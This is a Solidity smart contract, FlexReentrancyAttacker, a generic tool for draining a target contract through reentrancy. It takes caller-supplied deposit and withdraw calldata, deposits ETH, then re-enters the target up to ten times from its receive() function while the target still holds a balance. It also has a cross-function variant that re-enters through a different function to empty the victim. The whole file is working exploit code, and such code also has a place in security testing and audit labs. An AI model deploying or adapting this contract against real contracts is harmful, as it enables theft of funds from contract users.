// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice Generic reentrancy attacker. Works against any function signature —
/// caller provides pre-encoded deposit and withdraw calldata.
contract FlexReentrancyAttacker {
    address public target;
    bytes public reentryCalldata;
    uint256 public reentryCount;
    bool public attackInProgress;

    event AttackStarted(uint256 depositAmount);
    event Reentered(uint256 count, uint256 targetBalance);
    event AttackFinished(uint256 balance);

    constructor(address _target) {
        target = _target;
    }

    function attack(bytes calldata depositCalldata, bytes calldata withdrawCalldata) external payable {
        require(msg.value > 0, "Send ETH");
        reentryCalldata = withdrawCalldata;
        reentryCount = 0;
        attackInProgress = true;
        emit AttackStarted(msg.value);

        // Deposit into victim using whatever the deposit function is
        (bool ds, ) = target.call{value: msg.value}(depositCalldata);
        require(ds, "Deposit failed");

        // Trigger the vulnerable withdraw/transfer function
        (bool ws, ) = target.call(withdrawCalldata);
        require(ws, "Withdraw failed");

        attackInProgress = false;
        emit AttackFinished(address(this).balance);
    }

    /// @notice Cross-function reentrancy: initial call triggers re-entry,
    /// but re-entry uses a DIFFERENT function (e.g. emergencyWithdrawAll) to drain.
    function attackCrossFn(
        bytes calldata depositCalldata,
        bytes calldata initialCalldata,
        bytes calldata _reentryCalldata
    ) external payable {
        require(msg.value > 0, "Send ETH");
        reentryCalldata = _reentryCalldata;
        reentryCount = 0;
        attackInProgress = true;
        emit AttackStarted(msg.value);

        // Deposit into victim
        (bool ds, ) = target.call{value: msg.value}(depositCalldata);
        require(ds, "Deposit failed");

        // Trigger the vulnerable function — re-entry will use _reentryCalldata
        (bool ws, ) = target.call(initialCalldata);
        require(ws, "Initial call failed");

        attackInProgress = false;
        emit AttackFinished(address(this).balance);
    }

    receive() external payable {
        if (attackInProgress && reentryCount < 10 && target.balance > 0) {
            reentryCount++;
            emit Reentered(reentryCount, target.balance);
            // Intentionally ignore return value — last call may fail when balance hits 0
            target.call(reentryCalldata);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
